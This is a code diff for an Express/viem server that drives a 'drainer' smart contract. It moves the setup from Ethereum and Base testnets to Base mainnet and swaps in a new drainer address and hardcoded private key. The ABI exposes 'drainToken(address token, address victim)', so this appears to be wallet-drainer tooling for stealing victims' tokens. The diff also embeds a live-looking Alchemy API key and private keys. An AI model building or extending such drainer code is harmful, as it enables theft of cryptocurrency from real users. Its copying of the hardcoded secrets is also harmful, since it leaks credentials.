@@ -1,5 +1,5 @@
 import { createPublicClient, createWalletClient, http, parseAbi } from 'viem';
-import { sepolia, baseSepolia } from 'viem/chains';
+import { base } from 'viem/chains';
 import { privateKeyToAccount } from 'viem/accounts';
 import express from 'express';
 
@@ -9,18 +9,13 @@ const PORT = process.env.PORT || 3003;
 // Configuration
 const CHAINS = [
   {
-    chain: sepolia,
-    drainer: '0xDD77CFe389E95b9D5e46ca56F4feE0fD0cb400B9',
-    rpc: 'https://eth-sepolia.g.alchemy.com/v2/H--HtDpZlgQ0zxKBt7zBC-DzXtxGRL0J'
-  },
-  {
-    chain: baseSepolia,
-    drainer: '0x95c033E817023e2B1C4e6e55F70d488FeC39fd24',
-    rpc: 'https://base-sepolia.g.alchemy.com/v2/H--HtDpZlgQ0zxKBt7zBC-DzXtxGRL0J'
+    chain: base,
+    drainer: '0x00461a19124f1f999615b4FcE749B76e9F0182A5',
+    rpc: 'https://base-mainnet.g.alchemy.com/v2/H--HtDpZlgQ0zxKBt7zBC-DzXtxGRL0J'
   }
 ];
 
-const PRIVATE_KEY = '0x8e4e0161ac8f367670394f767aabc24709cb1e3d4e9e6afe071b484859f1ac90';
+const PRIVATE_KEY = '0x05afb6d9ea08c0da681ae185ff8a78931cb86ec8990ea9bc23fb56b56a53a3c3';
 
 const DRAINER_ABI = parseAbi([
   'function drainToken(address token, address victim) external'
